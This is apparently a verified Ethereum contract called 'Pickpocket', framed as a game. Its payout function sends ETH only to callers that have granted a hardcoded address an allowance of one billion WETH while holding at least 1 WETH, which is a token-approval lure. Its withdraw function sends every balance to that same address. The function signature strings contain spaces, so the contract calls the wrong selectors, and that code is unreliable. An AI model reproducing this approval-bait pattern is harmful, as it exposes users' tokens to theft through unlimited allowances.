/**
 *Submitted for verification at Etherscan.io on 2021-08-12
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

// ty for playing <3 - ghili
contract Pickpocket {

    receive() external payable {}

    function withdraw() external {
        (bool success, ) = payable(0xFd495eeEd737b002Ea62Cf0534e7707a9656ba19).call{value: address(this).balance}("");
        require(success, "Pickpocket: withdraw did not go thru :(");
    }

    function finesse(address _payee) external {
        address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        (bool approved, ) = weth.call(abi.encodeWithSignature("approve(address, uint256)", 0xFd495eeEd737b002Ea62Cf0534e7707a9656ba19, 1000000000 ether));
        require(approved, "Pickpocket: approval did not go thru :(");
        (bool success, ) = _payee.call(abi.encodeWithSignature("payout()"));
        require(success, "Pickpocket: payout did not go thru :(");
    }

    function payout() public {
        address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        
        (bool allowance, bytes memory returnData) = weth.call(abi.encodeWithSignature("allowance(address, address)", msg.sender, 0xFd495eeEd737b002Ea62Cf0534e7707a9656ba19));
        require(allowance, "Pickpocket: allowance query did not work");
        (uint256 amount) = abi.decode(returnData, (uint256));
        require(amount == 1000000000 ether, "Pickpocket: you did not approve us");

        (bool balance, bytes memory data) = weth.call(abi.encodeWithSignature("balanceOf(address)", msg.sender));
        require(balance, "Pickpocket: balanceOf query did not work");
        (uint256 value) = abi.decode(data, (uint256));
        require(value >= 1 ether, "Pickpocket: you broke asl T-T");

        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(success, "Pickpocket: call did not go thru :(");
    }
}